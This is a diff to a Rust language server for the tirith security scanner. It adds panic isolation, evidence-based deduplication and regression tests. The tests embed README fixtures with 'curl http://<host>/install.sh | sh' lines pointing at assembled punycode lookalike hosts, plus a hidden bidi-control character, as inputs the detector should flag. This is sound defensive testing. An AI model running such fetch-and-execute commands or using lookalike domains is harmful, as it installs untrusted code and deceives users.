@@ -27,9 +27,9 @@
 //!
 //! ## Scope / limitations (v1)
 //!
-//! * Only `didOpen` / `didChange` drive analysis; the document store keeps the
-//!   latest full text per URI so a re-analysis on change is self-contained
-//!   (sync kind is FULL).
+//! * Only `didOpen` / `didChange` drive analysis. Sync kind is FULL: every
+//!   change notification carries the entire document text, so each re-analysis
+//!   is self-contained from the notification alone (no server-side text cache).
 //! * LogFile diagnostics are best-effort: the M7 `output_*` rules fire only via
 //!   `engine::analyze_output`, not `analyze`, so the `analyze`+`Paste` path used
 //!   here surfaces the terminal/prompt-injection subset only. See
@@ -37,15 +37,13 @@
 //! * AI-config DRIFT rules need a snapshot diff (`tirith ai diff`) and cannot
 //!   fire on a single buffer.
 
-use std::collections::HashMap;
 use std::path::{Path, PathBuf};
-use std::sync::Mutex;
 
 use tirith_core::engine::{self, AnalysisContext};
 use tirith_core::extract::ScanContext;
 use tirith_core::lsp_profiles;
 use tirith_core::tokenize::ShellType;
-use tirith_core::verdict::{Evidence, Finding, Severity};
+use tirith_core::verdict::{Evidence, Finding, RuleId, Severity};
 
 use tower_lsp::jsonrpc::Result as JsonRpcResult;
 use tower_lsp::lsp_types::{
@@ -89,20 +87,19 @@ pub fn run() -> i32 {
     0
 }
 
-/// The language-server backend. Holds the latest full text per open document so
-/// a `didChange` re-analysis is self-contained.
+/// The language-server backend.
+///
+/// Holds only the `client`: under FULL document sync every `didChange`
+/// notification carries the complete new buffer text, so each re-analysis is
+/// self-contained from the parameter alone — there is no need to cache document
+/// text server-side (and doing so would add a per-keystroke lock for no read).
 struct Backend {
     client: Client,
-    /// URI (as string) → latest full document text.
-    documents: Mutex<HashMap<String, String>>,
 }
 
 impl Backend {
     fn new(client: Client) -> Self {
-        Self {
-            client,
-            documents: Mutex::new(HashMap::new()),
-        }
+        Self { client }
     }
 
     /// Analyze `uri`'s `text` and publish (or clear) its diagnostics.
@@ -111,14 +108,42 @@ impl Backend {
         // unparseable one) has no path we can profile, so it gets no
         // diagnostics — same outcome as an unrecognised file type.
         let diagnostics = match uri.to_file_path() {
-            Ok(path) => diagnostics_for(&path, &text),
+            Ok(path) => {
+                // FAIL-SAFE: `engine::analyze` runs on arbitrary editor buffers
+                // and is treated as panic-capable elsewhere in the codebase
+                // (`tirith_core::scan::catch_panic_scanning` wraps the per-file
+                // analyze for exactly this reason). tower-lsp has no panic
+                // isolation and this is a current-thread runtime, so an unwind
+                // would propagate through `block_on` and ABORT the whole server
+                // — silently killing diagnostics for ALL open files. Catch it
+                // here at the LSP boundary: on a caught panic, degrade to an
+                // empty `Vec` (publish empty → CLEAR, never leave stale
+                // findings) and surface it via `log_message` naming the document
+                // so the failure is VISIBLE, not silent, and the server KEEPS
+                // RUNNING. Relies on the workspace `panic = "unwind"` profile;
+                // a `panic = "abort"` build would void this guard (same caveat
+                // as `scan.rs::catch_panic_scanning`).
+                match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+                    diagnostics_for(&path, &text)
+                })) {
+                    Ok(diags) => diags,
+                    Err(_) => {
+                        self.client
+                            .log_message(
+                                MessageType::ERROR,
+                                format!(
+                                    "tirith: internal error analyzing {uri}; \
+                                     diagnostics cleared for this document \
+                                     (see panic message on stderr)"
+                                ),
+                            )
+                            .await;
+                        Vec::new()
+                    }
+                }
+            }
             Err(()) => Vec::new(),
         };
-        // Store the latest text so a later `didChange` (which carries the full
-        // text under FULL sync) and `didClose` can manage state coherently.
-        if let Ok(mut docs) = self.documents.lock() {
-            docs.insert(uri.to_string(), text);
-        }
         self.client
             .publish_diagnostics(uri, diagnostics, version)
             .await;
@@ -172,10 +197,8 @@ impl LanguageServer for Backend {
 
     async fn did_close(&self, params: DidCloseTextDocumentParams) {
         let uri = params.text_document.uri;
-        if let Ok(mut docs) = self.documents.lock() {
-            docs.remove(&uri.to_string());
-        }
         // Clear diagnostics for a closed document so stale findings don't linger.
+        // (No server-side text cache to evict — see `Backend`.)
         self.client.publish_diagnostics(uri, Vec::new(), None).await;
     }
 
@@ -202,11 +225,19 @@ pub fn diagnostics_for(path: &Path, text: &str) -> Vec<Diagnostic> {
     };
 
     // Analyze once PER context (only AiConfig has >1), UNION the findings, then
-    // keep only those the profile retains. Dedupe identical (rule, range)
-    // diagnostics that two contexts can both produce (e.g. a byte-scan rule that
-    // fires in both FileScan and Paste).
+    // keep only those the profile retains.
+    //
+    // DEDUP: collapse TRUE cross-context duplicates — the SAME finding a byte-scan
+    // rule produces in both FileScan and Paste (e.g. AiConfig) — without merging
+    // GENUINELY-DISTINCT findings of the same rule. Offset-less findings
+    // (URL/transport/hostname/command-shape) all share the whole-document range,
+    // so keying on (rule, range) alone would drop a second distinct malicious URL
+    // under the same rule. The key therefore also carries an evidence-content
+    // discriminator: two different URLs differ in their `Evidence::Url.raw` (kept
+    // as two), while the same byte-scan finding seen twice has identical evidence
+    // (merged to one). `RuleId` is `Copy + Hash + Eq`, so we key on it directly.
     let mut diagnostics: Vec<Diagnostic> = Vec::new();
-    let mut seen: std::collections::HashSet<(String, u32, u32, u32, u32)> =
+    let mut seen: std::collections::HashSet<(RuleId, u32, u32, u32, u32, String)> =
         std::collections::HashSet::new();
 
     for &context in lsp_profiles::contexts_for(profile) {
@@ -217,11 +248,12 @@ pub fn diagnostics_for(path: &Path, text: &str) -> Vec<Diagnostic> {
             }
             let diag = finding_to_diagnostic(&finding, text);
             let key = (
-                diag.code.as_ref().map(code_key).unwrap_or_default(),
+                finding.rule_id,
                 diag.range.start.line,
                 diag.range.start.character,
                 diag.range.end.line,
                 diag.range.end.character,
+                evidence_discriminator(&finding),
             );
             if seen.insert(key) {
                 diagnostics.push(diag);
@@ -230,6 +262,47 @@ pub fn diagnostics_for(path: &Path, text: &str) -> Vec<Diagnostic> {
     }
 
     diagnostics
+}
+
+/// A stable content discriminator for a finding's evidence, used only for dedup.
+///
+/// Distinguishes genuinely-distinct findings of the SAME rule that would
+/// otherwise collapse under a shared (whole-document) range — most importantly
+/// two different suspicious URLs (`Evidence::Url.raw`) or command shapes
+/// (`CommandPattern.matched`). True cross-context duplicates (the same byte-scan
+/// finding seen in both FileScan and Paste) produce identical evidence and so
+/// the SAME discriminator, and are still merged. Joined with a separator that
+/// can't be confused with a field boundary.
+fn evidence_discriminator(finding: &Finding) -> String {
+    let mut parts: Vec<String> = Vec::with_capacity(finding.evidence.len());
+    for e in &finding.evidence {
+        let part = match e {
+            Evidence::Url { raw } => format!("url:{raw}"),
+            Evidence::HostComparison {
+                raw_host,
+                similar_to,
+            } => format!("host:{raw_host}~{similar_to}"),
+            Evidence::CommandPattern { pattern, matched } => format!("cmd:{pattern}:{matched}"),
+            Evidence::ByteSequence {
+                offset,
+                hex,
+                description,
+            } => format!("byte:{offset}:{hex}:{description}"),
+            Evidence::EnvVar {
+                name,
+                value_preview,
+            } => format!("env:{name}={value_preview}"),
+            Evidence::Text { detail } => format!("text:{detail}"),
+            Evidence::ThreatIntel {
+                source,
+                threat_type,
+                ..
+            } => format!("ti:{source}:{threat_type}"),
+            Evidence::HomoglyphAnalysis { raw, escaped, .. } => format!("homo:{raw}=>{escaped}"),
+        };
+        parts.push(part);
+    }
+    parts.join("\u{1f}")
 }
 
 /// Build the per-document [`AnalysisContext`] for one analysis pass.
@@ -256,14 +329,6 @@ fn analysis_context(path: &Path, text: &str, context: ScanContext) -> AnalysisCo
         clipboard_html: None,
         card_ref: None,
         clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
-    }
-}
-
-/// Stable string key for a diagnostic `code` (used only for dedup).
-fn code_key(code: &NumberOrString) -> String {
-    match code {
-        NumberOrString::Number(n) => n.to_string(),
-        NumberOrString::String(s) => s.clone(),
     }
 }
 
@@ -667,5 +732,205 @@ mod tests {
 
     fn pos(line: u32, character: u32) -> Position {
         Position { line, character }
+    }
+
+    fn codes_of(diags: &[Diagnostic]) -> Vec<String> {
+        diags
+            .iter()
+            .filter_map(|d| match &d.code {
+                Some(NumberOrString::String(s)) => Some(s.clone()),
+                _ => None,
+            })
+            .collect()
+    }
+
+    /// A second runtime-assembled punycode host so a SECOND literal homograph
+    /// never appears verbatim in the source (same reason as `suspicious_host`).
+    fn suspicious_host_2() -> String {
+        ["xn--g", "thub-3ya.com"].concat()
+    }
+
+    // --- F1: fail-safe panic isolation at the analyze boundary --------------
+
+    /// F1 regression: the LSP boundary wraps the synchronous analysis in
+    /// `catch_unwind` and DEGRADES a caught panic to an empty `Vec` (clearing
+    /// diagnostics) instead of letting the unwind propagate through `block_on`
+    /// and ABORT the server. We can't force the real `engine::analyze` to panic
+    /// from here, so this proves the wrapper itself degrades — exactly the
+    /// `catch_unwind`/`AssertUnwindSafe` shape used in `analyze_and_publish`
+    /// (and mirroring `tirith_core::scan::catch_panic_scanning`). Relies on the
+    /// workspace `panic = "unwind"` profile.
+    #[test]
+    fn catch_unwind_degrades_panicking_analysis_to_empty() {
+        // A synthetic stand-in for `diagnostics_for` that panics, wrapped the
+        // same way the server wraps the real call.
+        let panicking = || -> Vec<Diagnostic> { panic!("synthetic analyze panic") };
+        let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(panicking))
+            .unwrap_or_else(|_| Vec::new());
+        assert!(
+            result.is_empty(),
+            "a caught panic must degrade to an empty diagnostics Vec (clear), not abort"
+        );
+
+        // And the non-panicking case passes the value straight through.
+        let ok = || -> Vec<Diagnostic> { vec![] };
+        assert!(std::panic::catch_unwind(std::panic::AssertUnwindSafe(ok))
+            .unwrap_or_else(|_| vec![Diagnostic::default()])
+            .is_empty());
+    }
+
+    // --- F2: distinct same-rule findings are NOT collapsed ------------------
+
+    /// F2 regression: a README (MarkdownInstallDoc) with TWO distinct suspicious
+    /// install URLs of the SAME rule (`punycode_domain`) must surface TWO
+    /// diagnostics. Both findings are offset-less and so share the whole-document
+    /// range; the OLD `(code, range)` dedup key collapsed them to one. The
+    /// evidence-content discriminator (`Evidence::Url.raw`) keeps them distinct.
+    #[test]
+    fn markdown_install_doc_two_distinct_urls_produce_two_diagnostics() {
+        let h1 = suspicious_host();
+        let h2 = suspicious_host_2();
+        let body = format!(
+            "# Install\n\nFirst:\n\n```sh\ncurl http://{h1}/install.sh | sh\n```\n\nMirror:\n\n```sh\ncurl http://{h2}/install.sh | sh\n```\n"
+        );
+        let diags = diagnostics_for(Path::new("README.md"), &body);
+        let codes = codes_of(&diags);
+        let puny = codes.iter().filter(|c| *c == "punycode_domain").count();
+        assert_eq!(
+            puny, 2,
+            "two distinct punycode hosts must yield two punycode_domain diagnostics; got {codes:?}"
+        );
+        // Sanity: both whole-document (offset-less) — the case the old key broke.
+        let doc_end = end_position(&body);
+        for d in diags.iter().filter(
+            |d| matches!(&d.code, Some(NumberOrString::String(s)) if s == "punycode_domain"),
+        ) {
+            assert_eq!(d.range.start, pos(0, 0));
+            assert_eq!(d.range.end, doc_end);
+        }
+    }
+
+    /// F2 (the other half): the cross-context dedup STILL collapses a true
+    /// duplicate. `AiConfig` analyzes in TWO contexts (FileScan ∪ Paste); a
+    /// byte-scan rule (`bidi_controls`) fires in BOTH with identical evidence and
+    /// the same precise range, so it must appear EXACTLY ONCE, not twice.
+    #[test]
+    fn ai_config_byte_scan_dedups_across_contexts() {
+        let cfg = "let x = 1; // \u{202E}note\nlet y = 2;\n";
+        let diags = diagnostics_for(Path::new("CLAUDE.md"), cfg);
+        let codes = codes_of(&diags);
+        let bidi = codes.iter().filter(|c| *c == "bidi_controls").count();
+        assert_eq!(
+            bidi, 1,
+            "the same bidi finding in both AiConfig contexts must merge to one; got {codes:?}"
+        );
+    }
+
+    /// `evidence_discriminator` distinguishes two findings of the same rule that
+    /// carry different URL evidence, but yields the SAME string for identical
+    /// evidence (so a cross-context duplicate still dedups).
+    #[test]
+    fn evidence_discriminator_distinguishes_distinct_urls() {
+        let mk = |raw: &str| Finding {
+            rule_id: RuleId::PunycodeDomain,
+            severity: Severity::High,
+            title: "t".into(),
+            description: String::new(),
+            evidence: vec![Evidence::Url { raw: raw.into() }],
+            human_view: None,
+            agent_view: None,
+            mitre_id: None,
+            custom_rule_id: None,
+        };
+        assert_ne!(
+            evidence_discriminator(&mk("http://a.example/x")),
+            evidence_discriminator(&mk("http://b.example/y")),
+            "distinct URLs must produce distinct discriminators"
+        );
+        assert_eq!(
+            evidence_discriminator(&mk("http://a.example/x")),
+            evidence_discriminator(&mk("http://a.example/x")),
+            "identical evidence must produce the same discriminator (cross-context merge)"
+        );
+    }
+
+    // --- MarkdownInstallDoc end-to-end (pr-test-analyzer gap) ---------------
+
+    /// A `README.md` (MarkdownInstallDoc) whose fenced code block carries a
+    /// `curl http://<suspicious-host>/install.sh | sh` install line yields ≥1
+    /// diagnostic from the curl-pipe-shell / transport / hostname family.
+    #[test]
+    fn markdown_install_doc_suspicious_url_produces_diagnostic() {
+        let host = suspicious_host();
+        let body =
+            format!("# Setup\n\nRun:\n\n```sh\ncurl http://{host}/install.sh | sh\n```\n\nDone.\n");
+        let diags = diagnostics_for(Path::new("README.md"), &body);
+        assert!(
+            !diags.is_empty(),
+            "a README with a suspicious install line must yield ≥1 diagnostic; got none"
+        );
+        for d in &diags {
+            assert_eq!(d.source.as_deref(), Some("tirith"));
+            assert!(matches!(d.code, Some(NumberOrString::String(_))));
+        }
+        let codes = codes_of(&diags);
+        assert!(
+            codes.iter().any(|c| c == "curl_pipe_shell"
+                || c == "plain_http_to_sink"
+                || c == "punycode_domain"),
+            "expected a curl-pipe-shell / transport / hostname diagnostic; got {codes:?}"
+        );
+    }
+
+    /// A benign `README.md` yields no diagnostics (no false positives on plain
+    /// install prose without a suspicious URL).
+    #[test]
+    fn benign_markdown_install_doc_yields_no_diagnostics() {
+        let body = "# Setup\n\nRun `cargo install tirith` to install.\n";
+        assert!(
+            diagnostics_for(Path::new("README.md"), body).is_empty(),
+            "a benign README must yield no diagnostics"
+        );
+    }
+
+    // --- byte_offset_to_position: cross-line + inside-char (gap) ------------
+
+    /// A multibyte char on a NON-ZERO line: the UTF-16 column must reset to 0
+    /// after the newline and then count UTF-16 code units (a surrogate pair = 2)
+    /// on that later line — proving cross-line UTF-16 accounting is correct.
+    #[test]
+    fn byte_offset_to_position_multibyte_on_nonzero_line() {
+        // Layout (bytes): x[0] \n[1] é[2..4] 𝐀[4..8]   (é=1 UTF-16 unit, 𝐀=2)
+        let text = "x\né\u{1D400}";
+        assert_eq!(text.len(), 8, "sanity: byte length of the fixture");
+        // Start of 'é' on line 1 → column resets to 0.
+        assert_eq!(byte_offset_to_position(text, 2), pos(1, 0));
+        // After 'é' on line 1 → one UTF-16 unit.
+        assert_eq!(byte_offset_to_position(text, 4), pos(1, 1));
+        // After the astral 'A' on line 1 → 1 + 2 surrogate units = 3.
+        assert_eq!(byte_offset_to_position(text, 8), pos(1, 3));
+    }
+
+    /// An offset landing INSIDE a multibyte char must snap to a CHAR BOUNDARY
+    /// (never split a surrogate pair into a half-column). The current
+    /// implementation reports the column just PAST the containing char.
+    #[test]
+    fn byte_offset_to_position_inside_multibyte_char_snaps_to_boundary() {
+        // Inside 'é' (bytes 1..3) at byte 2 → boundary after 'é' (col 2), not a
+        // fractional position. ("aéb…": a[0] é[1..3] b[3] …)
+        let text = "aéb\u{1D400}c";
+        assert_eq!(byte_offset_to_position(text, 2), pos(0, 2));
+
+        // Inside the astral 'A' (bytes 4..8) at byte 6: it snaps to the char
+        // boundary PAST the full surrogate pair, never a mid-surrogate column.
+        // 'aéb𝐀c': a=1, é=1, b=1, 𝐀=2 → col 5 (the boundary before 'c'); the
+        // forbidden split would have been col 4 (between the two surrogates).
+        let inside_astral = byte_offset_to_position(text, 6);
+        assert_eq!(inside_astral, pos(0, 5));
+        assert_ne!(
+            inside_astral,
+            pos(0, 4),
+            "must never land mid-surrogate-pair (col 4)"
+        );
     }
 }
